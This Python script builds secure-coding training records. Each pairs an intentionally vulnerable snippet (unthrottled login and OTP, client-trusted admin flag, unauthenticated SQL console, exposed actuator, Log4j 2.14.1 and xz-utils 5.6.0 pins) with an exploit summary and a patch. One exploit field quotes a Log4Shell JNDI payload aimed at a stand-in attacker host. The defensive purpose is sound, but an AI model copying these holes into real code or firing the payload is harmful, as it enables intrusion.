"""Curation Sprint 001 — batch 4: missing rate limit, unsafe admin route, dependency risk."""
from __future__ import annotations

import json

from training.sprint_data.sprint001_batch1 import CWE_RATE, OUT_DIR, case

CASES = [
    # ----------------------- MISSING_RATE_LIMIT -----------------------
    case(source_type="owasp", source_ref="no brute-force protection on login / CWE-307",
         lang="python", framework="fastapi", filename="auth.py",
         code="@app.post('/login')\ndef login(c: Creds):\n    return {'token': issue(check(c.user, c.pw))}\n",
         category="MISSING_RATE_LIMIT",
         description="Login lacks rate limiting / lockout (no brute-force protection).",
         exploit="Attackers brute-force passwords at full speed with no throttle.",
         patch="+from .ratelimit import limiter\n @app.post('/login')\n+@limiter.limit('5/minute')\n def login(c: Creds):\n     return {'token': issue(check(c.user, c.pw))}",
         severity="MEDIUM",
         references={"cwe": CWE_RATE, "owasp": "A07:2021-Identification and Authentication Failures", "cve": None},
         reviewer_notes="CWE-307 improper restriction of auth attempts."),
    case(source_type="owasp", source_ref="OTP endpoint no attempt cap / CWE-307",
         lang="javascript", framework="express", filename="otp.js",
         code="app.post('/otp/verify', (req,res) => res.json({ok: req.body.code === sess.code}));\n",
         category="MISSING_RATE_LIMIT",
         description="OTP verification has no attempt cap or expiry on failures.",
         exploit="A 6-digit code is brute-forced quickly without limits.",
         patch="+const otp = rateLimit({ windowMs: 600000, max: 5 });\n-app.post('/otp/verify', (req,res) =>\n+app.post('/otp/verify', otp, (req,res) =>\n   res.json({ok: req.body.code === sess.code}));",
         severity="MEDIUM",
         references={"cwe": CWE_RATE, "owasp": "A07:2021-Identification and Authentication Failures", "cve": None},
         reviewer_notes="Attempt cap + limiter; CWE-307."),
    case(source_type="vibecoded", source_ref="nullsec-scanner: AI-generated unthrottled paid endpoint",
         lang="python", framework="fastapi", filename="ai.py",
         code="@app.post('/summarize')\ndef summarize(text: str):\n    return {'summary': llm.complete(text)}\n",
         category="MISSING_RATE_LIMIT",
         description="AI-generated paid-LLM endpoint is unauthenticated and unthrottled (denial of wallet).",
         exploit="An attacker loops requests to exhaust quota and run up cost.",
         patch="+@limiter.limit('20/minute')\n @app.post('/summarize')\n-def summarize(text: str):\n+def summarize(text: str, key=Depends(api_key)):\n     return {'summary': llm.complete(text)}",
         severity="MEDIUM",
         references={"cwe": CWE_RATE, "owasp": "A04:2021-Insecure Design", "cve": None},
         extra_fail_dims=("auth",),
         reviewer_notes="Real vibecoded denial-of-wallet; auth+limit. CWE-307/770."),

    # ----------------------- UNSAFE_ADMIN_ROUTE -----------------------
    case(source_type="owasp", source_ref="Spring actuator exposed / CWE-16",
         lang="yaml", framework="spring", filename="application.yml",
         code="management:\n  endpoints:\n    web:\n      exposure:\n        include: '*'\n",
         category="UNSAFE_ADMIN_ROUTE",
         description="All Spring actuator endpoints exposed publicly (/env, /heapdump).",
         exploit="/actuator/env leaks secrets; /actuator/heapdump dumps memory to any caller.",
         patch="-        include: '*'\n+        include: 'health,info'",
         severity="HIGH",
         references={"cwe": "CWE-16", "owasp": "A05:2021-Security Misconfiguration", "cve": None},
         extra_fail_dims=("environment_exposure",),
         reviewer_notes="Restrict actuator exposure; misconfig A05."),
    case(source_type="semgrep", source_ref="client-trusted role check / CWE-602",
         lang="javascript", framework="express", filename="admin.js",
         code="app.post('/admin/grant', (req,res) => {\n  if (req.body.isAdmin) db.grant(req.body.target, 'admin');\n  res.end();\n});\n",
         category="UNSAFE_ADMIN_ROUTE",
         description="Privilege grant gated on a client-supplied isAdmin flag.",
         exploit="Any client posts isAdmin=true to grant themselves admin.",
         patch="-  if (req.body.isAdmin) db.grant(req.body.target, 'admin');\n+  if (req.session.user?.role === 'admin') db.grant(req.body.target, 'admin');\n+  else res.status(403).end();",
         references={"cwe": "CWE-602", "owasp": "A01:2021-Broken Access Control", "cve": None},
         extra_fail_dims=("auth",),
         reviewer_notes="Server-side role; CWE-602 client-side enforcement of server security."),
    case(source_type="owasp", source_ref="debug/admin console without auth / CWE-489",
         lang="python", framework="flask", filename="admin.py",
         code="@app.route('/admin/sql')\ndef admin_sql():\n    return str(db.execute(request.args['q']).fetchall())\n",
         category="UNSAFE_ADMIN_ROUTE",
         description="Admin SQL console with no authentication; arbitrary query execution.",
         exploit="Anyone calls /admin/sql?q=... to read or modify the entire database.",
         patch="-@app.route('/admin/sql')\n-def admin_sql():\n-    return str(db.execute(request.args['q']).fetchall())\n+# removed: ad-hoc SQL console is never acceptable in a deployed app",
         severity="HIGH",
         references={"cwe": "CWE-489", "owasp": "A01:2021-Broken Access Control", "cve": None},
         extra_fail_dims=("auth", "input_validation"),
         reviewer_notes="Remove console; CWE-489/306."),

    # ----------------------- DEPENDENCY_RISK -----------------------
    case(source_type="cve", source_ref="CVE-2021-44228 Log4Shell (Apache Log4j2)",
         lang="xml", framework="maven", filename="pom.xml",
         code="<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.14.1</version>\n</dependency>\n",
         category="DEPENDENCY_RISK",
         description="Log4j 2.14.1 is vulnerable to Log4Shell RCE via JNDI lookups (CVE-2021-44228).",
         exploit="A logged string like ${jndi:ldap://attacker/a} triggers remote class loading and RCE.",
         patch="-  <version>2.14.1</version>\n+  <version>2.17.1</version>",
         severity="CRITICAL",
         references={"cwe": "CWE-502", "owasp": "A06:2021-Vulnerable and Outdated Components",
                     "cve": "CVE-2021-44228"},
         reviewer_notes="CVE-2021-44228 verified: vulnerable 2.0-beta9..2.14.1, fixed 2.15+ (use 2.17.1). CWE-502."),
    case(source_type="cve", source_ref="CVE-2024-3094 XZ Utils backdoor",
         lang="text", framework="apt", filename="Dockerfile",
         code="RUN apt-get install -y xz-utils=5.6.0\n",
         category="DEPENDENCY_RISK",
         description="xz-utils 5.6.0/5.6.1 contained a planted backdoor (CVE-2024-3094) targeting sshd.",
         exploit="The backdoored liblzma allows authentication bypass / RCE on affected systems.",
         patch="-RUN apt-get install -y xz-utils=5.6.0\n+RUN apt-get install -y xz-utils=5.4.6  # pre-backdoor; pin a known-good version",
         severity="CRITICAL",
         references={"cwe": "CWE-506", "owasp": "A06:2021-Vulnerable and Outdated Components",
                     "cve": "CVE-2024-3094"},
         reviewer_notes="CVE-2024-3094 verified (XZ Utils supply-chain backdoor, 5.6.0/5.6.1). CWE-506."),
    case(source_type="semgrep", source_ref="unpinned dependency / CWE-1104",
         lang="json", framework="npm", filename="package.json",
         code="{ \"dependencies\": { \"lodash\": \"*\", \"node-fetch\": \"latest\" } }\n",
         category="DEPENDENCY_RISK",
         description="Dependencies pinned to '*'/'latest' pull arbitrary future versions.",
         exploit="A compromised future release is auto-installed on the next build (supply chain).",
         patch="-{ \"dependencies\": { \"lodash\": \"*\", \"node-fetch\": \"latest\" } }\n+{ \"dependencies\": { \"lodash\": \"4.17.21\", \"node-fetch\": \"2.7.0\" } }",
         severity="MEDIUM",
         references={"cwe": "CWE-1104", "owasp": "A06:2021-Vulnerable and Outdated Components", "cve": None},
         reviewer_notes="Pin exact versions + lockfile; CWE-1104 unmaintained/unpinned components."),
]


def main():
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    out = OUT_DIR / "sprint001_batch4.jsonl"
    with out.open("w", encoding="utf-8") as fh:
        for c in CASES:
            fh.write(json.dumps(c) + "\n")
    print(f"staged {len(CASES)} records -> {out}")


if __name__ == "__main__":
    main()
